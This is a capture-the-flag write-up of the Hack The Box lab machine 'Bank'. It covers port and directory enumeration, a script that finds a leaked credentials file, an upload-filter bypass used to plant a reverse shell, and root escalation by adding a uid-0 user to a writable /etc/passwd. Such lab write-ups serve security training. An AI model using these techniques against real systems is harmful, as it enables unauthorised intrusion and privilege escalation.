---
layout: post
title: Hack the Box - Bank
date: 2020-08-11 13:54:22 +0100
description: Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.
img: bank.png
fig-caption: Bank
categories: HackTheBox
tags: [Easy, Linux, Retired, CTF]
---
## Overview
Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
└─$ sudo nmap -p- -T4   10.129.117.190 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 14:10 GMT
Nmap scan report for 10.129.117.190
Host is up (0.016s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds
```
After port enumeration it is relatively clear that port 80 is what we should focus on, but when we navigate to it in the browser we only receive the default page. Slightly annoyingly the hostname needs to be guessed `bank.htb`, when we use that though we are greeted with a login page. On fuzzing that domain name we find an unusual directory `balance-transfer`.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bank.htb/FUZZ      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
:: Progress: [220547/220547] :: Job [1/1] :: 2573 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
```
When we go to the balance-transfer directory we see multiple files, to help find an unusual file I wrote a script to help find it.
```py
import urllib3
from bs4 import BeautifulSoup

def get_url_paths(url, ext='', params={}):
    http = urllib3.PoolManager()
    response = http.request('GET', url)
    if response.status == 200:
        response_text = response.data
    else:
        return response.raise_for_status()
    soup = BeautifulSoup(response_text, 'html.parser')
    parent = [url + node.get('href') for node in soup.find_all('a') if node.get('href').endswith(ext)]
    return parent

url = 'http://bank.htb/balance-transfer/'
ext = 'acc'
result = get_url_paths(url, ext)
http = urllib3.PoolManager()

for account_url in result:
    response = http.request("GET", account_url, preload_content=False)
    content_bytes = response.headers.get("Content-Length")
    if int(content_bytes) < 581:
        print(content_bytes + ": " + account_url)
    if int(content_bytes) > 585:
        print(content_bytes + ": " + account_url)
```
When we find that file we can see login credentials contained within.
## Foothold
On browsing the site we find a support page that you can use to upload files, located in the source code on the page is a comment that says you can use the `.htb` extension to bypass the upload filter. When we do this we can upload a reverse shell, then access it in the uploads folder.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
└─$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.117.190] 35620
www-data@bank:/var/www/bank/uploads$ whoami
whoami
www-data
```
## Privilege Escalation
When running linpeas we see that `/etc/passwd` is writable. So I took a copy of the current `passwd` file generated a new password hash and added a line for a new user with the same uid and gid of root then copied it back up to the server.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bank]
└─$ mkpasswd --method=SHA-512 --stdin                                                                                                                                                                                                  130 ⨯
Password: random
$6$Odmo32dEorRGP6Fd$gxwLG7SEJks59m90cpk6nZdVPlaXylsGoWYEVRiVdisbZuHUesHZPgUQrbP.4i338A7K4J9d67CghfiRkCzpL0
```
After doing that we can switch to that new user
```
www-data@bank:/tmp$ su test
su test
Password: random

root@bank:/tmp# whoami
whoami
root
```
